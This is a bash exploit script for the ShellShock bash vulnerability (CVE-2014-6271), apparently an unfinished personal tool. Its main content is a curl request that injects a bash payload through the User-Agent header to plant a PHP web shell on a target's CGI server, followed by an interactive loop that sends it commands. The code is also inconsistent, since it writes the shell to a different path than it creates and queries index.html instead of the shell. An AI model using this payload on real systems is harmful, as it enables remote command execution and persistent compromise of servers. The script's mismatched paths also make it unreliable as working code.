#!/bin/bash
#
# CVE-2014-6271
# ShellShock Exploit
# https://nvd.nist.gov/vuln/detail/CVE-2014-6271
#
# ALMOST DONE> STILL WORKING ON STEADY COMMAND INJECITON. absolute path to commands is needed. 
# I believe it may be best to use the RCE to obtain a real shell so this creates a web shell with a GUI to use.
#
# Allow Ctrl+C to kill pingsweep
trap '
  trap - INT # restore default INT handler
    kill -s INT "$$"
    ' INT

if [ -z "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ] ; then
                # This option displays a help message and command execution examples
                echo ""
                echo "OsbornePro CVE-2014-6271 1.0 ( https://roberthosborne.com )"
                echo ""
                echo "USAGE: CVE-2014-6271 -i <target ip> -p <port> -u <uri>"
                echo ""
                echo "OPTIONS:"
                echo "  -h : Displays the help information for the command."
                echo "  -i : Defines the ip address of the target"
                echo "  -p : Defines the port the web server is running on"
                echo "  -u : Defines the URI that is exploitable to ShellShock"
                echo ""
                echo "EXAMPLES:"
                echo "  CVE-2014-6271 -i 10.10.10.10 -p 8080 -u '/cgi-bin/index.cgi'"
                echo "  # This example exploits shell shock at http://10.10.10.10.:8080/cgi-bin/index.cgi"
                echo ""
                exit
fi

while getopts ":i:p:u:" OPT; do
        case $OPT in
                i) ip=$OPTARG;;
                p) port=$OPTARG;;
		u) uri=$OPTARG;;
        esac
done

if [ -z "$ip" ]
then
	printf "[!] Please define the ip address or hostname of the target\n"	
	exit
fi

if [ -z "$port" ]
then
	printf "[*] A valid port was not defined\nSetting default value to 80"
	port=80
fi

if [ -z "$uri" ]
then
	printf "[*] No uri was defined. Setting default value to /cgi-bin/index.cgi\n"
	uri="/cgi-bin/index.cgi"
fi

printf "[*] Sending exploit...\n"

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '/usr/bin/touch /var/www/html/simple.php; /bin/chmod 777 /var/www/html/simple.php; echo -en \"<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><? if($_GET[\"cmd\"]) { system($_GET[\"cmd\"]); }?></pre></BODY></HTML>\" > /var/www/www/simple.php'" http://${ip}:${port}${uri}

while :; do
	printf "[php-web-shell>]"
	read CMD
	curl --data-urlencode "cmd=$CMD" http://$ip:$port/index.html || curl http://$ip:$port/index.html?cmd=$CMD
	printf "\n"
done
